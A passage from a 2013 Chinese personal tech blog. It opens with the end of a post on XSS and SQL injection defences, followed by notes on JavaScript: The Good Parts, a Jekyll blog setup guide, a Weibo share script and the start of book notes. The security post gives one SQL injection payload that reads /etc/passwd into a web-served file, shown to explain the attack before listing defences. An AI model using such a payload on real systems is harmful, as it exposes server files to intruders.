<p>但是如果用户受到了XSS攻击，那么是有办法将这个验证码弄到手并发送到黑客服务器脚本的，这样相当于有个间谍在内部，拿到了电报密码，代号什么的都不管用了。其实不管什么办法，这都不安全，除非进行认证（密码学），确实不可伪造。</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>对于SQL注入，就是说黑客预料到可能会执行某个sql操作，于是提交含有恶意代码的输入。例如：</p>
<pre><code>$query = “SELECT * FROM v_movie WHERE movieid=$movieid” ;
// 而movieid用户输入的是
$movieid = “1 UNION select load_file(‘/etc/passwd’) into outfile ‘&lt;webroot&gt;/passwd.txt’”;
</code></pre><p>那么将会把密码都输出到服务器某个文本文件上，黑客可以直接按url访问，这相当恐怖。所以对于所有要放到数据库中的数据，在PHP中都要进行严格的数据检查，对于敏感的如单引号，双引号等应该予以转义。我们开发中常用的就是自己写一个addSlash。coolshell的博客中还提及了利用摄像头摄入车牌号进行注入，可谓是无所不能。</p>
<p>对sql注入主要的防范方法有：</p>
<ol>
<li>严格检查参数类型</li>
<li>使用正则表达式来过滤数据</li>
<li>严格限制执行权限（刚刚好够用的权限，而不是root）</li>
<li>注意日志，追踪攻击</li>
</ol>
<p>参考链接：</p>
<p><a href="http://stackoverflow.com/questions/129677/whats-the-best-method-for-sanitizing-user-input-with-php/130323#130323" target="_blank" rel="noopener">stack overflow</a></p>
<p><a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">coolshell微博蠕虫分析</a></p>
<p><a href="http://snoopyxdy.blog.163.com/blog/static/60117440201281294147873/" target="_blank" rel="noopener">nodejs注入实例</a></p>
<p>by bibodeng 2013-10-05</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/09/16/【读书】 javascript  the good part 读书笔记/" itemprop="url">
                  【读书】 javascript  the good part 读书笔记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-09-16T22:49:18+08:00" content="2013-09-16">
              2013-09-16
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/09/16/【读书】 javascript  the good part 读书笔记/" class="leancloud_visitors" data-flag-title="【读书】 javascript  the good part 读书笔记">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="javascript-the-good-part-读书笔记"><a href="#javascript-the-good-part-读书笔记" class="headerlink" title="javascript: the good part 读书笔记"></a>javascript: the good part 读书笔记</h1><p>###对象的声明方式<br>var obj = {<br>    firstname : ‘bibo’,<br>    lastname: ‘deng’<br>}</p>
<p>var obj = {<br>    “firstname”: ‘bibo’,<br>    “lastname”: ‘deng’<br>}</p>
<p>访问的方式也有对应的两种，obj[‘firstname’], obj.firstname, 这其中涉及到关键字的问题，因为关键字是不能赤裸裸地作为变量或者对象的属性使用，好歹给个包装吧（“”）。且对象都是以引用的方式存在于程序中，也就是内存中只保留一份该对象。</p>
<p>###自省<br>hasOwnProperty() 判断是否有某个属性，与prototype链无关</p>
<p>typeof 关键字能够得到对象的类型名称字符串</p>
<p>###原型链</p>
<p>对于所有的继承者，都是可见的，这种灵活性，是那些extends所不具有的</p>
<p>###避免全局<br>封装起来，自成一体。这个可以在接下来的项目中使用。</p>
<p>###删除的穿透性<br>删除了对象当前的某属性，它会自动取其prototype的该属性的值作为新值？ write an example ,and ask for my teacher.</p>
<p>###函数<br>函数，由其上下文和代码决定。<br>四种调用方式：</p>
<ul>
<li>方法式</li>
<li>函数式   new , 返回了函数这个object，也就是this</li>
<li>构造函数式</li>
<li>func.apply(obj,array) / func.call(obj,args) 式（移花接木）</li>
</ul>
<p>函数在内部获取参数：</p>
<p>arguments[i] 获得第i个参数，甚至不需要声明需要多少个参数，但是它不是一个数组</p>
<p>js对于参数是相当宽松的，多了不抱怨，少了也不嫌</p>
<p>给函数添加属性：</p>
<pre><code>Function.prototype.method = function (name, func) { 
    this.prototype[name] = func; 
    return this; 
};

Number.method(&apos;integer&apos;, function (  ) { 
    return Math[this &lt; 0 ? &apos;ceiling&apos; : &apos;floor&apos;](this); 
    // 又见到了这个表达 floor(-2.3)是等于-3的
}); 
</code></pre><p>必须使用prototype来进行扩展。</p>
<p>###作用域<br>C语言类似的可以保持block范围作用域，用花括号括起来的部分，除了这个范围，就不能使用了。javascript却不支持块作用域，却会覆盖外层作用域的声明，但是它支持函数作用域，也就是离开了当前函数，外面就不能访问函数内部定义的数据了。所以javascript中的应用，一般是要用到就先在最前面声明好。</p>
<p>###闭包</p>
<blockquote>
<p>A function literal can appear anywhere that an expression can appear. Functions can be defined inside of other functions. An inner function of course has access to its parameters and variables. An inner function also enjoys access to the parameters and variables of the functions it is nested within. <em>The function object created by a function literal contains a link to that outer context. This is called closure.</em>This is the source of enormous expressive power.</p>
</blockquote>
<p>在其他一些语言，如C/C++中，函数里面不能再定义函数了，当然也没有很明显的函数式编程思想。有一次我用在我看来不可思议的方式来写一个setInterval：</p>
<pre><code>$(document).ready(function(){
    var t = setInterval( function(){
        // some other code here
        var i = 0;
        i ++;
        console.log(i);
        if (true)
        {
            clearInterval(t);
        }
    }, 100);
});
</code></pre><p>审慎地判断一下，这属于闭包吗？ 里面用到的t的确是在上一层空间定义的,的确只运行了一次console.log()就停止了，去掉clearInterval之后，可以运行多次，但是i一直是1，那是因为每进入一次都是不同的环境了,这可能不是一个很好的例子。我问了一下我的导师，他说闭包是可运行的代码和其运行环境共同组成的，常见的表现形式就是函数包函数。我继续问，那么这个闭包内的生存期有多长，他回答应该是随着外部变量的消亡而灭亡。因为它带有对改上下文的引用，这样确保了函数作用域和信息的隐藏。</p>
<p>闭包的例子：</p>
<pre><code>var myObject = function (  ) { 
    var value = 0; 

    return { 
        increment: function (inc) { 
            value += typeof inc === &apos;number&apos; ? inc : 1; 
        }, 
        getValue: function (  ) { 
            return value; 
        } 
    } 
}(  );
</code></pre><p>能够起到隐藏的功能。定义的value,当myObject构造好了之后，依然可以通过myObject.getValue（）的方式来使用value。这令我感到很神奇。返回后的对象还能够使用原来函数的东西，好像嫁出去的女儿，可以回娘家一样（可以使用的东西有 参数，内部变量）。我实验了一下，去掉函数的立即执行，新建两个对象来进行比对，然后发现每一个新生成的obj对象，都具有不同的运行环境，也具有独立的value,这相当于是面向对象的一个替代封装，但是具有其本身的灵活性，并且可以将来可以使用prototype来进行扩展:</p>
<pre><code>$(document).ready(function(){
    var myObject = function (  ) { 
                var value = 0; 

            return { 
                increment: function (inc) { 
                    value += typeof inc === &apos;number&apos; ? inc : 1; 
                }, 
                getValue: function (  ) { 
                    return value; 
                } 
            } 
        };

        var obj1 = myObject();
        obj1.increment(1);
        obj1.increment(1);
        console.log(obj1.getValue()); // 2
        var obj2 = myObject();
        obj2.increment(1);
        obj2.increment(1);
        obj2.increment(1);
        console.log(obj2.getValue()); // 3
});
</code></pre><p>接下来我将读一点《jQuery源码剖析》来深入理解javascript的这种机制。</p>
<p>###异常<br>异常的检测及throw:</p>
<pre><code>var add = function (a, b) { 
    if (typeof a !== &apos;number&apos; || typeof b !== &apos;number&apos;) { 
        throw {     // throw a exception object
            name: &apos;TypeError&apos;, 
            message: &apos;add needs numbers&apos; 
        } 
    } 
    return a + b; 
}
</code></pre><p>###数组<br>数组与对象不同，它无需字典那样定义索引，而是以自然数为索引，并且有length这个属性，以及其他有用的操作。它不会超界，而是会自动扩展到足够大以容纳最大界限。</p>
<p>typeof arr 得到的是“object“，故而需要进一步检查constructor === Array 才能判断arr确实是一个数组。数组人仍然是object。</p>
<p>###正则表达式<br>常见方法：</p>
<blockquote>
<ul>
<li>regexp.test(str)<ul>
<li>regexp.exec(str)        // 匹配结果从1开始</li>
<li>string.match(regexp)</li>
<li>string.replace(regexp)</li>
<li>string.search(regexp)</li>
<li>string.split(regexp)</li>
</ul>
</li>
</ul>
</blockquote>
<p>这个是书上的例子：</p>
<pre><code>var parse_url = /^(?:([A-Za-z]+):)?(\/{0,3})([0-9.\-A-Za-z]+)(?::(\d+))?(?:\/([^?#]*))?(?:\?([^#]*))?(?:#(.*))?$/; 
</code></pre><p>实在是有点长，之前有点regexp基础，所以能够看懂一些，但是对于表达式中的<code>?:</code>需要解释一下，它是non-capture-group标志，也就是这个括号看起来像个分组，但是在exec匹配的结果中不要显示它，例如匹配协议名的<code>(?:([A-Za-z]+):)</code> 虽然匹配了后面的冒号，但是结果中并不包含，如果是http:匹配了只得到http，这样就避免了得到不想要的分组。</p>
<p>控制字符：</p>
<blockquote>
<p>\ / [ ] ( ) { } ? + * | . ^ $</p>
</blockquote>
<p>尾部标识：</p>
<blockquote>
<ul>
<li>g       —— 全局匹配<ul>
<li>i       —— 大小写通吃</li>
<li>m       —— 多行 $可匹配行尾</li>
</ul>
</li>
</ul>
</blockquote>
<p>转义：</p>
<blockquote>
<ul>
<li>\d \b \s \w 匹配相应文法 数字 单字 空白字符 字符0-9a-zA-Z<ul>
<li>\D \B \S \W 上面对应集合的非\D = [^\d] </li>
<li>\u00FF 双字节字符</li>
<li>\1 表示前面匹配到的第一分组<code>（）</code>只对capturing-group生效</li>
</ul>
</li>
</ul>
</blockquote>
<p>[]定义的字符类内的转义与上面的有点不一样，<code>\b</code>变成了退格符号，就不能在用来表示字了，相应的<code>\B</code>就没有了。</p>
<p>计数:</p>
<blockquote>
<ul>
<li>{m,n} 匹配m到n次<ul>
<li>{m} 相当于{m,m}</li>
<li>* 匹配任意次</li>
<li>+ 匹配至少一次</li>
<li>？ 匹配或者不匹配，它就在那里</li>
</ul>
</li>
</ul>
</blockquote>
<p>###内置方法</p>
<ul>
<li><p>array</p>
<ul>
<li>array.concat（elem1, elem2, …） 追加 数组追加数组，会合并，而不是直接加入数组 </li>
<li>array.join(separator) 用数组元素组成一个用separator分隔开的字符串 [‘I’, ‘am’, ‘bibo’] =&gt; “I am bibo”</li>
<li>array.push(elem) 这才是真正的追加，单个被加入，数组也被视为单个对象</li>
<li>array.pop() 获取最后一个元素</li>
<li>array.reverse() 翻转元素顺序</li>
<li>array.shift() 返回并删除第一个元素</li>
<li>array.slice(start, end) 截取数组片段</li>
<li><p>array.sort(compareFunc) 排序,传入一个比较函数，默认按字符序</p>
<blockquote>
<p>compareFunc 讲得很清楚，传入两个参数，相等返回0, 第一个参数在前，返回负数，第二个参数在前，返回一个正数，例如最经典的是比较整数return a-b 从小到大排列</p>
</blockquote>
</li>
<li><p>array.splice(start, deleteCount, item…) 删除若干，并从删除位置添加</p>
</li>
<li>array.unshift(item,…) 从前面加</li>
</ul>
</li>
<li><p>string</p>
<ul>
<li>str.entityify 特殊字符html编码化 ‘&amp;’ =&gt; ‘&amp;amp’;</li>
<li>str.charAt(pos) 返回pos位置上的字符</li>
<li>str.charCodeAt(pos) 返回字符ASCII码</li>
<li>str.concat(str1, str2…) 链接字符串</li>
<li>str.indexOf(str1, pos) 查找某个字符串，pos起始位置可选，-1没找到，这个函数很常见 </li>
<li>str.lastIndexOf(str1, pos) 从后开始查找</li>
<li>str.localeCompare(str1) 比较字符，str &lt; str1 则返回负数，比较规则字母序</li>
<li>str.match(regexp) 做匹配，结果与regexp.exec(str)一样,如果有g则返回一组匹配值，但是不会返回分组</li>
<li><p>str.replace(val-old, val-new) 替换字符内的字符，就像编辑器的替换一样，可以使用全局的regexp,这样可以替换所有匹配的值， val-new中$有特殊含义</p>
<blockquote>
<ul>
<li>$$         :  $</li>
</ul>
</blockquote>
</li>
<li>$&amp;      :   The matched text</li>
<li>$number:    Capture group text</li>
<li>$`         :  The text preceding the match</li>
<li><p>$’         : The text following the match</p>
</li>
<li><p>str.search(regexp) 查找第一个匹配位置</p>
</li>
<li>str.slice(pos1, pos2) 截取字符串,第一个参数为负，会自动加一次str.length,超过str.length则会当作0看待</li>
<li>str.split(separator, limit) 分片字符串，limit为分片数限制</li>
<li>str.substring(begin, end) 求子串,没有slice那么强大</li>
<li>str.toLocaleLowerCase()   带本地化的字母小写化</li>
<li>str.toLocaleUpperCase()</li>
<li>str.toLowerCase()         字母小写化</li>
<li>str.toUpperCase()</li>
<li>String.fromCharCode(code1,…) 从数码转成字符串</li>
</ul>
</li>
<li><p>number</p>
<ul>
<li>number.toExponential(小数位数)  返回一个科学计数的字符串</li>
<li>number.toFixed(小数位数) 返回一个定点表示的实数字符串</li>
<li>number.toPrecision(实数长度) 返回一个实数字符串</li>
<li>number.toString(进制)</li>
</ul>
</li>
<li><p>object</p>
<ul>
<li>hasOwnProperty(pname) 是否具有某属性，不追溯到prototype</li>
</ul>
</li>
<li><p>regExp</p>
<ul>
<li>exp.exec(string) 对字符进行匹配，返回数组，0是整个匹配值，后面的按分组返回结果<blockquote>
<p>如果exp带有g标志，也就是全局标志，则是从exp.lastIndex开始匹配的,匹配成功则                lastIndex为匹配段后的第一个字符位置，也就是说有一个记录功能，可以接着从这个位置匹配，这就可以在一个exp上循环地开始匹配了。如果匹配不成功则lastIndex为0。</p>
</blockquote>
</li>
<li>exp.test(string) 匹配返回true,否则返回false</li>
</ul>
</li>
</ul>
<p>###style</p>
<p>命名，表达式，块，都有一些规则可以使得更加优雅并且能避免错误。尽量做到逻辑明晰，自我阐述。</p>
<p>Sometimes I think about comments as a time machine that I use to send important messages to future me. 这句话讲得好贴切啊。</p>
<p>javascript 没有块作用域，也就是说块内的东西不算是块私有的，而C块内声明的变量只能在块内使用，这样尽量延后声明时间可以具有更合适的作用域，但是javascript不是这样，故而经常可以看到一些高手是在函数开头就把所有变量声明好。</p>
<pre><code>if (true)
{
        var sum = 0;
        for (var i=0; i&lt;10; i++)
        {
            var name = &apos;aa&apos;;
            sum += i;
        }
        console.log(sum, name);
        //输出 45 &quot;aa&quot;
}


if (my_value &amp;&amp; typeof my_value === &apos;object&apos;) { 
    // my_value is an object or an array! 
}
因为typeof null是 object, 但是可以用 my_value是否为假来加以判断

不要依赖js自动帮你加分号

减少全局变量的使用，它会搞乱变量的关系，我自己在开发中也遇到这样的问题

parseInt(&quot;08&quot;, 10) 应该提供第二个参数指定进制  

NaN 是一个number,不等于任何数，包括它自身的number，这是有多纠结呢，用isNaN（NaN）来判断  

isFinite() 接受所有不是NaN, Infinity的数字

if (my_value &amp;&amp; typeof my_value === &apos;object&apos; &amp;&amp; 
    my_value.constructor === Array) { 
    // 判断是否是数组
}
</code></pre><p>蛋疼的类型判断(typeof)：</p>
<pre><code>Value      |    Type
--------------------
0          |    Number
NaN          |   (not a number)    Number
&apos;&apos;          |   (empty string)    String
false      |    Boolean
null      |    Object
undefined |       Undefined
</code></pre><p>使用=== 和 ！== 类型要相同才能比较</p>
<blockquote>
<p>The worst features of a language aren’t the features that are obviously dangerous or useless. Those are easily avoided. The worst features are the attractive nuisances, the features that are both useful and dangerous.</p>
</blockquote>
<pre><code>(function (  ) { 
    var hidden_variable; 

    // This function can have some impact on 
    // the environment, but introduces no new 
    // global variables. 
})(  );
// 这样写可以避免新建一个function全局对象
</code></pre><p>使用<a href="http://www.JSLint.com/." target="_blank" rel="noopener">JSLint</a>来提高代码质量,使自己变成一个更好的程序员。</p>
<p>eval is evil ,当然我们有时候会发现在服务器返回的是字符串格式的JSON的时候，eval(json)将会非常有用。但是书中说这涉及安全问题，应该对JSON进行parse,也就是写一个解析器解析一遍。代码有点复杂，下次单独分离出来进行分析。</p>
<p>读完这本书，我才对javascript有更清晰的认识，一开始接触js的时候，觉得它很奇怪，虽然语法和C很相似，但是其用法，尤其是函数式编程，还有prototype,闭包很难理解。现在终于有种拨开迷雾见天日的感觉。本书还教导我们怎样避免一些容易犯错的地方，来使自己成为一个更好的js程序员。</p>
<p>by bibodeng 2013-09-16</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/09/14/jekyll 上搭建github.page式博客/" itemprop="url">
                  jekyll 上搭建github.page式博客
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-09-14T12:12:59+08:00" content="2013-09-14">
              2013-09-14
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/09/14/jekyll 上搭建github.page式博客/" class="leancloud_visitors" data-flag-title="jekyll 上搭建github.page式博客">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="jekyll-上搭建github-page式博客"><a href="#jekyll-上搭建github-page式博客" class="headerlink" title="jekyll 上搭建github.page式博客"></a>jekyll 上搭建github.page式博客</h1><p>之前独立博客上的各种各样的问题，例如垃圾评论，模板不支持代码高亮， 彻底惹恼了我，所以准备投奔jekyll的怀抱，直接到github page上写博客。折腾了一天，总算弄得差不多了。</p>
<p>###第一步 建立自己的项目<br>首先，要有github账号，新建一个github的项目，叫做 username.github.com, 现在github为了不让github page 影响性能，专门用 github.io域名提供page服务。在自己的github主页上新建一个repo，然后就可以了。</p>
<p>###第二步 clone别人的项目<br>我是直接把别人已经搭建好的jekyll项目，包括模板主题和建好的目录等。在终端运行下面命令：</p>
<pre><code>$ git clone https://github.com/plusjade/jekyll-bootstrap.git USERNAME.github.com 
$ cd USERNAME.github.com 
$ git remote set-url origin git@github.com:USERNAME/USERNAME.github.com.git 
$ git push origin master
</code></pre><p> 这样就可以就算部署成功了。过几分钟后，访问 <a href="http://USERNAME.github.io" target="_blank" rel="noopener"><code>http://USERNAME.github.io</code></a> 你就能看到生成的页面了，如果不能生成，可能是你的index.yml文件出错了，github会发邮件给你。</p>
<p>###第三步 搭建jekyll本地环境<br>jekyll是基于ruby的，所以你要先安装ruby，我的机器是ubuntu13.04， 已经预装了ruby1.9.1</p>
<pre><code>sudo apt-get install rubygems
sudo gems install jekyll
</code></pre><p>但是我发现会碰到这样的问题：</p>
<pre><code>Unable to install gem - Failed to build gem native extension - cannot load such file— mkmf (LoadError)
</code></pre><p>报告说某个包找不到了，可能是我们的版本不够高，stack overflow 上有类似的<a href="http://stackoverflow.com/questions/13767725/unable-to-install-gem-failed-to-build-gem-native-extension-cannot-load-such" target="_blank" rel="noopener">问题</a></p>
<p>解决办法是安装 ruby1.9.1-dev:</p>
<pre><code>sudo apt-get install ruby1.9.1-dev
</code></pre><p>可能之后还要解决一些问题，例如配置博客config.yml:</p>
<pre><code>author:
    name: USERNAME
    email: USERNAME@gmail.com
    github: USERNAME
    ...
</code></pre><p>更加详细的配置参考<a href="http://jekyllbootstrap.com/usage/blog-configuration.html" target="_blank" rel="noopener">jekyll的评论，google统计</a></p>
<p>###第四步 开始在本地写博文<br>现在可以开始在本地写博文了，使用如下命令：</p>
<pre><code>rake post title = &quot;hello world&quot;
</code></pre><p>你将看到_post下面为你自动生成了一个.md后缀文件，编辑它就是写文章了。你会发现生成的文件都是这样的开头：</p>
<pre><code>---
layout: post
title: &quot;hello world&quot;
description: &quot;&quot;
category: 这里填分类（需要是post下的一个文件夹）
tags: [标签1, 标签2]
---
{% include JB/setup %}
这里开始是正文
</code></pre><p>也可以新建页面：</p>
<pre><code>rake page name = &quot;about.md&quot;
</code></pre><p>写完了，可以在本地测试：</p>
<pre><code>cd USERNAME.github.com
jekyll serve
</code></pre><p>访问<code>http://localhost:4000</code> 就可以访问你的博文了。</p>
<p>###第五步 用git上传博文<br>我们就三板斧就够了：</p>
<pre><code>git add .     // 添加当前目录所有内容
git commit -m &quot;add passage x&quot;
git push origin master
</code></pre><p>这样就成功提交了自己的文章，在github项目中可以看到自己上传的文件，而在你的博客  <code>http://USERNAME.github.io</code>  中也生成成功了。<br>enjoy yourself。</p>
<p>###进阶 写作<br>使用markdown教程</p>
<p>一开始会很折腾，但是熟练了之后，的确可以专注于写作。</p>
<p>参考链接：</p>
<p><a href="http://www.mceiba.com/develop/jekyll-introduction.html" target="_blank" rel="noopener">利用jekyll搭建个人博客</a></p>
<p><a href="http://wowubuntu.com/markdown/#link" target="_blank" rel="noopener">markdown 手册</a></p>
<p><a href="http://yanping.me/cn/blog/2012/03/18/github-pages-step-by-step/" target="_blank" rel="noopener">github page 极简教程</a></p>
<p><a href="http://jekyllbootstrap.com/" target="_blank" rel="noopener">jekyllboostrap 项目</a></p>
<p><a href="http://bibodeng.github.io">我的github博客</a></p>
<p>by bibodeng 2013-9-6</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/08/22/实现网站SNS分享/" itemprop="url">
                  实现网站SNS分享
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-08-22T09:19:45+08:00" content="2013-08-22">
              2013-08-22
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/08/22/实现网站SNS分享/" class="leancloud_visitors" data-flag-title="实现网站SNS分享">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
<div>网页开发中，经常要实现将内容分享到sns网站，以获得更多的关注。在前段时间做活动页的过程中，多次用到了引入微博分享功能，要将一个分享写得优雅，正确，还真的需要一定的经验。平常的网页中，都有一些分享的js插件，只需要在页面中嵌入第三方的js代码就ok了。本文将讲讲怎样实现一个社交分享功能。</div>
<div>&nbsp;</div>
<div>方法一： 使用微博提供的接口，直接部署分享组件。</div>
<div>&nbsp;</div>
<div>在 <a href="http://open.weibo.com/widgets" target="_blank" rel="noopener">http://open.weibo.com/widgets</a> 
这个页面中，有介绍各种常用的微博组件。按照文档，直接在该页面定制组件，生成代码，贴到我们的网页中去就可以了。</div>
<div>&nbsp;</div>
<div>方法二： 使用第三方的组件</div>
<div>&nbsp;</div>
<div>不直接在开放平台引入接口，而是用第三方的集成了多种社交网络的功能组件。例如 <a href="http://www.jiathis.com/" target="_blank" rel="noopener">http://www.jiathis.com/</a>&nbsp;这里，也可以定制你常用的分享组件，和方法一差不多，都是嵌入一段代码。</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>方法三 ： 自己动手写js代码</div>
<div>&nbsp;</div>
<div>有时候网站设计上要求各种元素要丰富有个性，往往组件什么的就太简陋了，不太适用。那么就需要自己动手写一个分享功能。比如，在某些时候，我们的网页设计师给程序猿设计好了一个漂亮的分享按钮，但是是图片，那么这时候嵌入组件显然不太合适，那么就写一段代码，通过各种SNS网站的接口发布出去。我们发现，其实微博分享，也不过是构造一个url带有各种参数，传递到该页，然后打开一个新窗口，供用户发布就ok了。</div>
<div>&nbsp;<p><span style="line-height:1.5;">以新浪微博为例：</span></p>
</div>
<pre class="brush:js; toolbar: true; auto-links: true;">var Share = {
    openWindow: function(url, name, properties) {
        properties = (properties || "");
        if (!window.open(url, name, properties)) {
            window.self.location.href = url;
        }
        return false;
    },
    tsina:  function (title, href, content) {
        title = (title || "" );
        href = (href || window.self.location.href);
        content = (content || "" );
         var url = "http://v.t.sina.com.cn/share/share.php?c=spr_web_bd_tudou_weibo&amp;title=" + encodeURIComponent(title + "\n" + content) + "&amp;url=" + encodeURIComponent(href);
         return Share.openWindow(url, "Sina" );
    }
};</pre> <div>写一个函数，只要传入title，url，还有要分享的content，那么就可以构造一个分享的链接了。分享的链接格式，所带参数名称都要参考对应的开放平台的文档。依次类推，就可以写出一个自己的Share库了，这样就可以调用Share.tsina()这样进行分享了，极大地方便了js编写分享功能。对于url进行了encodeURIComponent()处理，将一些在url中的控制字符转换成为安全的编码格式。你将会看到编码成这样的奇怪的url：<a href="http://share.sina.com/index.php?title=%E9%87%91%E7%AB%8B%E5%AE%98%E7%BD%91" target="_blank" rel="noopener">http://share.sina.com/index.php?title=%E9%87%91%E7%AB%8B%E5%AE%98%E7%BD%91</a></div>
<div>&nbsp;</div>
<div>有了这个基础，就可以做选择某部分文本进行分享，点击某按钮进行分享了。更多微博控件，可以参考<a href="http://open.weibo.com/widgets" style="line-height:1.5;font-family:'sans serif', tahoma, verdana, helvetica;" target="_blank" rel="noopener">http://open.weibo.com/widgets</a></div>
<div>&nbsp;</div>
<div>by bibodeng</div>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/08/06/曾国藩传记笔记/" itemprop="url">
                  曾国藩传记笔记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-08-06T00:23:55+08:00" content="2013-08-06">
              2013-08-06
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/08/06/曾国藩传记笔记/" class="leancloud_visitors" data-flag-title="曾国藩传记笔记">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
<title>曾国藩传记笔记</title> <meta content="text/html; charset=unicode" http-equiv="Content-Type"><!--defaultCSS--><meta name="GENERATOR" content="MSHTML 8.00.7601.17514"> <style id="wiz_custom_css" type="text/css">
body
{
    font-family: "Microsoft YaHei UI","Microsoft YaHei",SimSun,"Segoe UI",Tahoma,Helvetica,Sans-Serif,"Microsoft YaHei", Georgia,Helvetica,Arial,sans-serif,宋体, PMingLiU,serif;
    font-size: 10.5pt;
    line-height: 1.5;
}
html, body
{
    
    
}
h1 {
    font-size:1.5em;
    font-weight:bold;
}
h2 {
    font-size:1.4em;
    font-weight:bold;
}
h3 {
    font-size:1.3em;
    font-weight:bold;
}
h4 {
    font-size:1.2em;
    font-weight:bold;
}
h5 {
    font-size:1.1em;
    font-weight:bold;
}
h6 {
    font-size:1.0em;
    font-weight:bold;
}
img {
    border:0;
    max-width: 100%;
}
blockquote {
    margin-top:0px;
    margin-bottom:0px;
}


</style>
<link rel="stylesheet" type="text/css" href="/content/plugins/bibo_mark/article_bibo.css"> <div class="art_content"><div style="text-align:center;"><a target="_blank" href="/content/plugins/kl_album/upload/201308/8446e72c0c56714095f12fcd49567e232013080516184316883.jpg" style="line-height:1.3em;"><img src="/content/plugins/kl_album/upload/201308/8446e72c0c56714095f12fcd49567e232013080516184316883.jpg" width="257" height="360" alt="点击查看原图" border="0"></a></div>
<div class="art_content">唐浩明之《曾国藩》共分上中下三部，一为血祭，二为野焚，三为黑雨。通览曾国藩之一身，青年得志，官场平步青云，中年指挥万千兵马，老年倡导洋务，功成身退。历史上许多人物对曾国藩的评价甚高，例如他的同僚左宗棠，虽一生与之互相争高下，然而却是互相敬重。也包括毛泽东，蒋介石，梁启超等都对曾国藩予以过高度评价。我读他的文章，传记，觉得传统儒家士大夫思想在其身上体现淋漓尽致，他的思想中具有中华民族文化的精髓。如立身求学之道，文章治国之道，自强御侮之道，是我们中华民族后人应当熟悉而体悟的。五千年的文化，我们要懂得继承，同时学习外来的先进技术和文化，方能发扬光大，自强不息。</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">其让我钦佩的一点是，一生所学儒家仁忍，道教自然谦退，文章武功，都能够学而致用，并且能够以坚毅之志行之，而得盖世勋名。其学术为人方面的理论有很多，流传久远的就有《冰鉴》、《挺经》、《家书》等，皆是实用之见，而且其一生行事，谨慎，自节，足以让东敬畏。单就一生保持节俭习惯，睡简陋床，用简易竹箱，已经令人肃然起敬。晚清吏治腐败，而曾能得盖世名勋，建十万湘军，必有其过人之处。</div>
<div class="art_content">&nbsp;</div>
